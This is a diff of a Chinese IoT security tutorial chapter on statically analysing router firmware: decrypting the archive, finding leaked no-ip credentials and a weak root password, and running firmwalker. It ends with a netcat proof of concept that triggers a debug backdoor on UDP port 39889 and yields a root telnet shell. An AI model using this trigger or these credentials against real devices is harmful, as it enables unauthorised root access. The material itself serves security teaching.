@@ -1,43 +1,86 @@
-# 提取 IoT 固件
+# 静态分析 IoT 固件
 
-首先我们需要安装固件提取工具 binwalk，由于该工具的安装流程比较繁琐，建议直接使用Kali Linux，该系统默认安装有 binwalk。
-```
-https://github.com/ReFirmLabs/binwalk
-```
-![1](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/01-%E6%8F%90%E5%8F%96IoT%E5%9B%BA%E4%BB%B6/1.png)
+得到固件后，若直接打开，会发现该固件被加了密，无法直接解压缩，这是厂商对该固件做了保护，防止大家逆向分析他的固件。
+![1](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/02-%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/1.png)
 
-提取固件系统的参数是-e，我们可以加上-t -vv参数查看详细的提取过程。通过输出信息，可以得知该固件系统没有加密压缩，且系统为Squashfs。
-```
-binwalk -t -vv -e RT-N300_3.0.0.4_378_9317-g2f672ff.trx
-```
-![2](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/01-%E6%8F%90%E5%8F%96IoT%E5%9B%BA%E4%BB%B6/2.png)
+通过frackzip工具可以破解该zip的密码，时间要挺久的，我直接告诉你吧，密码是beUT9Z。
+![2](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/02-%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/2.png)
 
-提取出来的文件夹为_RT-N300_3.0.0.4_378_9317-g2f672ff.trx.extracted，其中的squashfs-root就是我们想要的该固件的文件系统。
-![3](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/01-%E6%8F%90%E5%8F%96IoT%E5%9B%BA%E4%BB%B6/3.png)
+解压后发现文件夹中有多个.yaffs2后缀的文件，这些都是固件的文件。
+![3](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/02-%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/3.png)
 
-那么binwalk的是怎么实现提取的呢？原理就是，通过自带的强大的magic特征集，扫描固件中文件系统初始地址的特征码，若匹配成功，则将该段数据dump下来，这个magic特征集已公开。
+yaffs2里有几个看上去是recovery的镜像，核心的应该是2K-mdm-image-mdm9625.yaffs2 ，我们下面就来提取该文件，我首先用binwalk来提取它，但提取出来的文件乱七八糟，不知道什么原因，后来看网上推荐直接用yaffs的原生工具unyaffs提取，就可以了，文件系统清晰明了。
 ```
-https://github.com/ReFirmLabs/binwalk/blob/62e9caa164305a18d7d1f037ab27d14ac933d3cf/src/binwalk/magic/filesystems
+unyaffs 2K-mdm-image-mdm9625.yaffs2 yaffs2-root/
 ```
-![4](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/01-%E6%8F%90%E5%8F%96IoT%E5%9B%BA%E4%BB%B6/4.png)
+![4](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/02-%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/4.png)
 
-以这个固件为例，是Squashfs文件系统，对应的扫描特征码为hsqs。
-![5](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/01-%E6%8F%90%E5%8F%96IoT%E5%9B%BA%E4%BB%B6/5.png)
 
-我们可以做个实验，使用hexdump搜索hsqs的地址，为0xe20c0，这个就是文件系统的初始地址。
+接下来我们查找该路径下的所有.conf文件，.conf文件多是配置文件，有可能从中可以发现敏感的信息。
 ```
-hexdump -C RT-N300_3.0.0.4_378_9317-g2f672ff.trx | grep -i 'hsqs'
+find . -name '*.conf'
 ```
-![6](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/01-%E6%8F%90%E5%8F%96IoT%E5%9B%BA%E4%BB%B6/6.png)
+![5](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/02-%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/5.png)
 
-使用dd命令截取地址925888（0xe20c0）之后的数据，保存到rt-n300-fs。
+其中的inadyn-mt.conf文件引起了我们注意，这是no-ip应用的配置文件，no-ip就是一个相当于花生壳的东西，可以申请动态域名。我们从中可以发现泄露的no-ip的登陆账号及密码。
 ```
-dd if=RT-N300_3.0.0.4_378_9317-g2f672ff.trx bs=1 skip=925888 of=rt-n300-fs
+cat etc/inadyn-mt.conf
 ```
-![7](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/01-%E6%8F%90%E5%8F%96IoT%E5%9B%BA%E4%BB%B6/7.png)
+![6](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/02-%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/6.png)
 
-最后，使用unsquashfs rt-n300-fs命令解析rt-n300-fs文件，得到的squashfs-root就是固件系统，这个跟上述binwalk提取的那个是一样的。
+除了上述泄露的no-ip账号密码，我们还从shadow文件中找到了root账号的密码，通过爆破可以得到root的密码为1234。
 ```
-unsquashfs rt-n300-fs
+cat ~/yaffs2-root/etc/shadow
 ```
-![8](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/01-%E6%8F%90%E5%8F%96IoT%E5%9B%BA%E4%BB%B6/8.png)
+![7](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/02-%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/7.png)
+
+其实并不止有.conf文件会泄露信息，还有很多其他后缀的敏感文件会泄露信息，我们接下来使用firmwalker工具来自动化遍历该固件系统中的所有可疑文件。
+```
+git clone https://github.com/craigz28/firmwalker.git
+```
+![8](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/02-%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/8.png)
+
+命令如下，firmwalker会将结果保存到firmwalker.txt。
+```
+./firmwalker.sh ~/yaffs2-root/
+```
+![9](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/02-%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/9.png)
+
+看了下该工具的源码，没啥亮点，就是遍历各种后缀的文件。
+![10](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/02-%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/10.png)
+
+后缀都在data文件夹中的各个配置文件中。
+![11](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/02-%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/11.png)
+
+分析完敏感的配置文件后，我们接下来分析存在风险的二进制程序。查看自启动的程序，一个start_appmgr脚本引起了我们注意，mgr一般就是主控程序的意思。
+![12](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/02-%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/12.png)
+
+该脚本会在开机的时候以服务的形式运行/bin.appmgr程序。
+![13](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/02-%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/13.png)
+
+通过IDA进行反编译，在main函数中发现了一个管理员当时为了方便调试留下的后门，只要连接该固件的39889端口并发送HELODBG的字符串，就可以进行远程执行命令。
+![14](https://github.com/G4rb3n/IoT_Sec_Tutorial/blob/master/02-%E5%88%86%E6%9E%90IoT%E5%9B%BA%E4%BB%B6/14.png)
+
+POC如下：
+
+```
+user@kali:~$ echo -ne "HELODBG" | nc -u 192.168.1.1 39889 
+Hello 
+^C 
+user@kali:~$ telnet 192.168.1.1 
+Trying 192.168.1.1... 
+Connected to 192.168.1.1. Escape character is '^]'.   
+OpenEmbedded Linux homerouter.cpe     
+msm 20141210 homerouter.cpe   
+/ # 
+id uid=0(root) gid=0(root) 
+/ # 
+exit 
+Connection closed by foreign host. 
+user@kali:~$
+```
+
+除了以上这些，该固件还存在多个漏洞，详细的报告可以参考：
+```
+https://www.anquanke.com/post/id/84671
+```
